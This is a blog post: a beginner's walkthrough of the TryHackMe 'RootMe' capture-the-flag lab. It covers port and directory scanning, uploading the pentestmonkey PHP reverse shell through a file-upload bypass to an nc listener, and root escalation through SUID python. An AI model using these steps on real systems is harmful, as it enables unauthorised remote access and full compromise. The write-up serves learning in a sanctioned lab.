<!doctype html><html lang=en dir=auto><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>TryHackMe RootMe Walkthrough | Mr Ash Co</title>
<meta name=keywords content="TryHackMe,Capture The Flag,Walkthrough,100DaysOfHacking"><meta name=description content="I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.
This is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.
When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours."><meta name=author content="Mr Ash"><link rel=canonical href=//localhost:1313/tryhackme-rootme/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.5591f0f0e6da962274ad39d968be1ca571fe1593fa5f642efac68ccea21a574f.css integrity="sha256-VZHw8ObaliJ0rTnZaL4cpXH+FZP6X2Qu+saMzqIaV08=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.acb54fd32bbc1982428b8850317e45d076b95012730a5936667e6bc21777692a.js integrity="sha256-rLVP0yu8GYJCi4hQMX5F0Ha5UBJzClk2Zn5rwhd3aSo=" onload=hljs.initHighlightingOnLoad()></script><link rel=icon href="https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer&amp;v=db94595858aad20b777e4f130cbe5006"><link rel=icon type=image/png sizes=16x16 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=//localhost:1313/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=//localhost:1313/tryhackme-rootme/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="TryHackMe RootMe Walkthrough"><meta property="og:description" content="I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.
This is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.
When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours."><meta property="og:type" content="article"><meta property="og:url" content="//localhost:1313/tryhackme-rootme/"><meta property="og:image" content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post"><meta property="article:published_time" content="2021-04-02T00:00:00+00:00"><meta property="article:modified_time" content="2021-04-02T00:00:00+00:00"><meta property="og:site_name" content="Mr Ash Co"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="//localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="TryHackMe RootMe Walkthrough"><meta name=twitter:description content="I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.
This is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.
When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"//localhost:1313/post/"},{"@type":"ListItem","position":2,"name":"TryHackMe RootMe Walkthrough","item":"//localhost:1313/tryhackme-rootme/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"TryHackMe RootMe Walkthrough","name":"TryHackMe RootMe Walkthrough","description":"I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.\nThis is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.\nWhen you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.","keywords":["TryHackMe","Capture The Flag","Walkthrough","100DaysOfHacking"],"articleBody":"I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.\nThis is a beginner ‘easy’ game, their description reads a CTF for beginners, can you root me? If you’re unaware, root means top-level access, like super admin or master-of-everything.\nWhen you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.\nLet’s get started on RootMe\nReconnaissance First up, let’s scan the machine, how many ports are open?\n$ nmap -A -p- $ip # CTRL+C - Took too long. $ nmap -T4 -A $ip 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) So, second nmap scan found 2 ports open, ssh \u0026 http. Great, so that tells me it’s a web server, a non-secure one at that, and it’s able to have remote connection.\nNext, what version of Apache is running?\nOur scan has already pulled that information, 2.4.29. I’m thinking maybe I could look this verion up and find known exploit.\nWhat service is running on port 22?\nEasy again, got that from scan, ssh.\nFind directories on the web server using the GoBuster tool. Hint: gobuster dir -u -w WORDLIST_PATH.\nHm, this is a new tool, let’s first man it and see if I have it on kali.\n$ man gobuster # Not found. $ sudo apt install gobuster $ gobuster --help $ apt-cache show gobuster Directory/file \u0026 DNS busting tool written in Go Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains. So it’s ls but for enurmeration? Cool.\nAfter reading kali tools, I’ve got a wordlist to use, let’s go!\n$ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt /.hta /.htpasswd /.htaccess /css /index.php /js /panel # upload page /server-status /uploads While that’s running, I remembered I can go to to view frontend of the website… Nothing there, just a game landing page.\nNow the scan has finished, let’s try each page of the website via going /. Normal stuff accept the /panel page. Strange file upload and gives a spanish error msg, a bit odd, I’ll remember this for later.\n…or right now, what is the hidden directory? /panel/\nGetting A Shell Okay, now it’s about shell access, i.e. stepping into the machine and gaining basic level access.\nLet’s read the question, find a form to upload and get a reverse shell, and find the flag. Hint: Search for “file upload bypass” and “PHP reverse shell“.\nCool, first time using a reverse shell, still unsure what/how of this, but let’s learn by searching first recommendation.\nFile upload bypass, means, due to poor validation (secuirty) allows uploaded files to run by user or server.\nSearching PHP reverse shell shows what looks like a popular github page. Let’s git clone it and take look.\n$ mkrdir TryHackMe-rootme $ git clone TryHackMe-rootme $ nano php-reverse-shell.php I’m taking the time to read the program (usually I don’t). It’s recommending to go to pentestmonkey.net for help, looks like a great resource!\nSo netcat needs to be running to listen and ‘catch’ the reverse shell. Cool. Let’s setup nc, edit and upload the file\n$ip = '10.10.10.10'; // CHANGE THIS $port = 4444; // CHANGE THIS $ sudo nc -vlnp 4444 After tinkering around, not sure why, but the file extension of the reverse shell file had to be changed from .php to .php5 … my guess is this tells the website it’s PHP version 5 which it can work with? Not 100% sure.\nI started cheating by the way from this video. Just to get past this step.\nOnce the reverse shell was uploaded, I went to /uploads/ to execute the file and nc picked it up, wow! My heart actually dropped a bit, like this is remote access from an uploaded file. WTH!\nSo I had to cheat a bit more on this one, annoying as I could’ve figured it out if I had more patience.\n$ find / -type f -name user.txt 2\u003e/dev/null /var/ww/user.txt $ cat /var/ww/user.txt THM{*************************} Privilege Escalation Now that we have a shell, let’s escalate our privileges to root.\nCool. Let’s go.\nSearch for files with SUID permission, which file is weird?\n$ find / -user root -perm /4000 2\u003e/dev/null This is hard, I’m not sure what I’m looking for.\nI used the input field from TryHackMe /***/***/****** and just guessed which directory’s based on characters, /usr/bin/python.\nOkay, next, find a form to escalate your privileges, search for gtfobins.\nFound gtfobins, searched python and looked for SUID.\n…time passes.\nLook, I’ll be honest, I’ve got root and I have no idea what made it happen. I don’t understand python so it seems like magic right now. Anyway, here are the steps I took (or followed):\n$ /bin/bash python -c 'import pty;pty.spawn (\"/bin/bash\")' ./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")' Now I’ve got the # let’s search for the missing file.\n$ find / -type f -name root.txt 2\u003e/dev/null /root/root.txt $ cat /root/root.txt THM{*************************} Well, that’s the last flag, we did it! Thanks to Yesspider for their walkthrough video.\nLooking back this is a good beginner game, even if it felt really hard and lead me to cheat, I use the term ‘cheating’ loosely as it’s still learning. If I get so stuck I want to give up, it’s better to look at a walkthrough than stop altogether.\nI’m getting comfortable running some nmap which is great, and then sifting through information to find what I’m after.\nI learnt about gobuster, a tool I want to use more! It felt great using a reverse shell and understanding the concept even if I didn’t understand 100% of what I was following along with. Something about setting up nc to listen and catch information felt amazing!\nI loved used find one of the most basic commands which still havent clicked for me. Lastly using Python, now to be honest all of that went right over my head. But I’m using it, being more familiar, so it’s a start!\nHope you enjoyed this CTF Walkthrough.\nIf you have feedback, please send me a message via Twitter.\nThis is Day 6 of #100DaysOfHacking, subscribe to the newsletter to see the journey!\nHappy Hacking.\n","wordCount":"1052","inLanguage":"en","datePublished":"2021-04-02T00:00:00Z","dateModified":"2021-04-02T00:00:00Z","author":{"@type":"Person","name":"Mr Ash"},"mainEntityOfPage":{"@type":"WebPage","@id":"//localhost:1313/tryhackme-rootme/"},"publisher":{"@type":"Organization","name":"Mr Ash Co","logo":{"@type":"ImageObject","url":"https://p146.p4.n0.cdn.getcloudapp.com/items/Jrum0N6q/4ab8cbb7-d222-4c3c-963d-f0ec6c30568c.jpg?source=viewer\u0026v=db94595858aad20b777e4f130cbe5006"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=//localhost:1313/ accesskey=h title="mrashco (Alt + H)">mrashco</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=//localhost:1313/now title=now><span>now</span></a></li><li><a href=//localhost:1313/blog title=blog><span>blog</span></a></li><li><a href=//localhost:1313/letter title=letters><span>letters</span></a></li><li><a href=//localhost:1313/search title=" (Alt + /)" accesskey=/><span><svg xmlns="http://www.w3.org/2000/svg" width="17.5" height="17.5" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg></span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=//localhost:1313/>Home</a>&nbsp;»&nbsp;<a href=//localhost:1313/post/>Posts</a></div><h1 class=post-title>TryHackMe RootMe Walkthrough</h1><div class=post-meta><span title='2021-04-02 00:00:00 +0000 UTC'>02/04/2021</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1052 words&nbsp;·&nbsp;Mr Ash&nbsp;|&nbsp;<a href=https://github.com/mrashco/mrash.co/tree/main/content/post/2021/thm-rootme.md rel="noopener noreferrer" target=_blank>Suggest Edits</a></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#getting-a-shell>Getting A Shell</a></li><li><a href=#privilege-escalation>Privilege Escalation</a></li></ul></nav></div></details></div><div class=post-content><p>I’m still on the Complete Beginner learning path from TryHackMe, so this is my first venture outside into their library of CTF’s.</p><p>This is a beginner ‘easy’ game, their description reads <em>a CTF for beginners, can you root me?</em> If you’re unaware, root means top-level access, like super admin or master-of-everything.</p><p>When you gain root-level access, you own that machine, so install, delete, copy or whatever else you want, it’s yours.</p><p>Let’s get started on RootMe</p><h2 id=reconnaissance>Reconnaissance<a hidden class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><p>First up, let’s <em>scan the machine, how many ports are open?</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ nmap -A -p- <span class=nv>$ip</span> <span class=c1># CTRL+C - Took too long.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ nmap -T4 -A <span class=nv>$ip</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.29 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span></code></pre></div><p>So, second <code>nmap</code> scan found <code>2</code> ports open, <code>ssh</code> & <code>http</code>. Great, so that tells me it’s a web server, a non-secure one at that, and it’s able to have remote connection.</p><p>Next, <em>what version of Apache is running?</em></p><p>Our scan has already pulled that information, <code>2.4.29</code>. I’m thinking maybe I could look this verion up and find known exploit.</p><p><em>What service is running on port 22?</em></p><p>Easy again, got that from scan, <code>ssh.</code></p><p><em>Find directories on the web server using the GoBuster tool. Hint: <code>gobuster dir -u &lt;ip> -w WORDLIST_PATH</code>.</em></p><p>Hm, this is a new tool, let’s first <code>man</code> it and see if I have it on <code>kali</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ man gobuster <span class=c1># Not found.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo apt install gobuster
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ gobuster --help
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ apt-cache show gobuster
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Directory/file <span class=p>&amp;</span> DNS busting tool written in Go Gobuster is a tool used to brute-force URIs including directories and files as well as DNS subdomains.
</span></span></code></pre></div><p>So it’s <code>ls</code> but for enurmeration? Cool.</p><p>After reading <a href=https://tools.kali.org/web-applications/gobuster>kali tools</a>, I’ve got a wordlist to use, let’s go!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ gobuster dir -u 10.10.173.20 -w /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/.hta
</span></span><span class=line><span class=cl>/.htpasswd
</span></span><span class=line><span class=cl>/.htaccess
</span></span><span class=line><span class=cl>/css
</span></span><span class=line><span class=cl>/index.php
</span></span><span class=line><span class=cl>/js
</span></span><span class=line><span class=cl>/panel <span class=c1># upload page</span>
</span></span><span class=line><span class=cl>/server-status
</span></span><span class=line><span class=cl>/uploads
</span></span></code></pre></div><p>While that’s running, I remembered I can go to <code>&lt;ip></code> to view frontend of the website… Nothing there, just a game landing page.</p><p>Now the scan has finished, let’s try each page of the website via going <code>&lt;ip>/&lt;page></code>. Normal stuff accept the <code>/panel</code> page. Strange file upload and gives a spanish error msg, a bit odd, I’ll remember this for later.</p><p>…or right now, w<em>hat is the hidden directory?</em> <code>/panel/</code></p><h2 id=getting-a-shell>Getting A Shell<a hidden class=anchor aria-hidden=true href=#getting-a-shell>#</a></h2><p>Okay, now it’s about shell access, i.e. stepping into the machine and gaining basic level access.</p><p>Let’s read the question, <em>find a form to upload and get a <strong>reverse shell</strong>, and find the flag.</em> Hint: <em>Search for “<strong>file upload bypass</strong>” and “<strong>PHP reverse shell</strong>“.</em></p><p>Cool, first time using a reverse shell, still unsure what/how of this, but let’s learn by searching first recommendation.</p><p>File upload bypass, means, due to poor validation (secuirty) allows uploaded files to run by user or server.</p><p>Searching <code>PHP reverse shell</code> shows what looks like a <a href=https://github.com/pentestmonkey/php-reverse-shell>popular github page</a>. Let’s <code>git clone</code> it and take look.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ mkrdir TryHackMe-rootme
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ git clone &lt;https://github.com/pentestmonkey/php-reverse-shell.git&gt; TryHackMe-rootme
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ nano php-reverse-shell.php
</span></span></code></pre></div><p>I’m taking the time to read the program (usually I don’t). It’s recommending to go to <a href=http://pentestmonkey.net/>pentestmonkey.net</a> for help, looks like a great resource!</p><p>So <code>netcat</code> needs to be running to listen and ‘catch’ the reverse shell. Cool. Let’s setup <code>nc</code>, edit and upload the file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nv>$ip</span> <span class=o>=</span> <span class=s1>&#39;10.10.10.10&#39;</span><span class=p>;</span>  // CHANGE THIS
</span></span><span class=line><span class=cl><span class=nv>$port</span> <span class=o>=</span> 4444<span class=p>;</span>       // CHANGE THIS
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo nc -vlnp <span class=m>4444</span>
</span></span></code></pre></div><p>After tinkering around, not sure why, but the file extension of the reverse shell file had to be changed from <code>.php</code> to <code>.php5</code> … my guess is this tells the website it’s PHP version 5 which it can work with? Not 100% sure.</p><p>I started cheating by the way from this <a href=https://youtu.be/eDGI1RCkp8E>video</a>. Just to get past this step.</p><p>Once the reverse shell was uploaded, I went to <code>&lt;ip>/uploads/</code> to execute the file and <code>nc</code> picked it up, wow! My heart actually dropped a bit, like this is remote access from an uploaded file. WTH!</p><p>So I had to cheat a bit more on this one, annoying as I could’ve figured it out if I had more patience.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -type f -name user.txt 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/var/ww/user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /var/ww/user.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>THM<span class=o>{</span>*************************<span class=o>}</span>
</span></span></code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a hidden class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2><p><em>Now that we have a shell, let’s escalate our privileges to root.</em></p><p>Cool. Let’s go.</p><p><em>Search for files with SUID permission, which file is weird?</em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -user root -perm /4000 2&gt;/dev/null
</span></span></code></pre></div><p>This is hard, I’m not sure what I’m looking for.</p><p>I used the input field from TryHackMe <code>/***/***/******</code> and just guessed which directory’s based on characters, <code>/usr/bin/python</code>.</p><p>Okay, next, <em>find a form to escalate your privileges, search for gtfobins.</em></p><p>Found <a href=https://gtfobins.github.io/>gtfobins</a>, searched python and looked for SUID.</p><p>…time passes.</p><p>Look, I’ll be honest, I’ve got root and I have no idea what made it happen. I don’t understand python so it seems like magic right now. Anyway, here are the steps I took (or followed):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ /bin/bash
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;import pty;pty.spawn (&#34;/bin/bash&#34;)&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>./python -c <span class=s1>&#39;import os; os.execl(&#34;/bin/sh&#34;, &#34;sh&#34;, &#34;-p&#34;)&#39;</span>
</span></span></code></pre></div><p>Now I’ve got the <code>#</code> let’s search for the missing file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ find / -type f -name root.txt 2&gt;/dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/root/root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ cat /root/root.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>THM<span class=o>{</span>*************************<span class=o>}</span>
</span></span></code></pre></div><p>Well, that’s the last flag, we did it! Thanks to <a href=https://youtu.be/eDGI1RCkp8E>Yesspider</a> for their walkthrough video.</p><p>Looking back this is a good beginner game, even if it felt really hard and lead me to cheat, I use the term ‘cheating’ loosely as it’s still learning. If I get so stuck I want to give up, it’s better to look at a walkthrough than stop altogether.</p><p>I’m getting comfortable running some <code>nmap</code> which is great, and then sifting through information to find what I’m after.</p><p>I learnt about <code>gobuster</code>, a tool I want to use more! It felt great using a reverse shell and understanding the concept even if I didn’t understand 100% of what I was following along with. Something about setting up <code>nc</code> to listen and catch information felt amazing!</p><p>I loved used <code>find</code> one of the most basic commands which still havent clicked for me. Lastly using Python, now to be honest all of that went right over my head. But I’m using it, being more familiar, so it’s a start!</p><p>Hope you enjoyed this CTF Walkthrough.</p><p>If you have feedback, please send me a message via <a href=https://twitter.com/mrashleyball>Twitter</a>.</p><p>This is Day 6 of <a href=https://mrash.co/100daysofhacking/>#100DaysOfHacking</a>, subscribe to the <a href=https://go.mrash.co/newsletter>newsletter</a> to see the journey!</p><p>Happy Hacking.</p><br><div class=gist-embed-form data-form-type=embedded data-form-id=1489913 data-workspace-id=aw3xhcat version=3></div><script type=text/javascript src=https://forms-widget.getgist.com/ defer></script></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/tryhackme/>TryHackMe</a></li><li><a href=//localhost:1313/tags/capture-the-flag/>Capture the Flag</a></li><li><a href=//localhost:1313/tags/walkthrough/>Walkthrough</a></li><li><a href=//localhost:1313/tags/100daysofhacking/>100DaysOfHacking</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/kali-wsl/><span class=title>« Prev</span><br><span>Kali Linux WSL WITHOUT Microsoft Store</span>
</a><a class=next href=//localhost:1313/starting-out-in-cyber-security/><span class=title>Next »</span><br><span>Starting Out In Cyber Security</span></a></nav></footer></article></main><footer class=footer><span>Made with ♥ from Australia</span> •
<span>&copy; 2017-2024 <a href=/policies>Policies</a><br>Site by <a href=//localhost:1313/>Mr Ash Co</a></span>
<span>• Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>
x
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>